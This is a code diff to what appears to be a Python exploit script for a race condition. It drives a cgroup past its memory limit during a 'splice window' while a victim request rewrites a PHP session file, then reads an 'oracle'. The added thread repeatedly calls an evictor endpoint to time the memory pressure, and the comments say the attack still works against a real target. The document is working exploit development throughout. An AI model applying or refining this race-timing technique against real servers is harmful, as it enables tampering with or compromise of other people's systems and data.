@@ -31,6 +31,7 @@ import json
 import random
 import socket
 import sys
+import threading
 import time
 import urllib.parse
 
@@ -330,12 +331,33 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     res["pushed"] = pushed
     time.sleep(0.4)                 # let the charge settle before the victim
 
+    # Evict C's clean pages continuously while the victim reads, serializes
+    # and rewrites the record (stage 2's evictor, over HTTP): the pwrite
+    # then re-creates - re-charges - them, pushing the cgroup over its
+    # limit *inside* the splice window. Without this the overwrite is a
+    # net-zero charge on hosts whose writeback keeps the pages resident,
+    # and the crossing only ever lands past the window (the runner's feed:
+    # early / nooom / late-at-|C|, never a mix). Missing endpoint (a real
+    # target) = no-op, the nominal pressure applies unchanged.
+    drop_done = threading.Event()
+
+    def _drop() -> None:
+        try:
+            http_get(host, port, f"/index.php?drop={sid}&ms=4000",
+                     timeout=10)
+        except OSError:
+            pass
+        drop_done.set()
+
+    threading.Thread(target=_drop, daemon=True).start()
+
     victim, _ = lab.replacement_hold(sid)
     ev, drop_ms, vresp = victim_wait(victim, timeout=6.0)
     res["victim"] = ev
     res["drop_ms"] = round(drop_ms, 1)
     if vresp:
         res["vresp"] = vresp[:80].decode(errors="replace")
+    drop_done.wait(timeout=2)
 
     # Release the pressure BEFORE reading the oracle: the consumer has to
     # read the (up to 16 MiB) session file and must not OOM on the way.
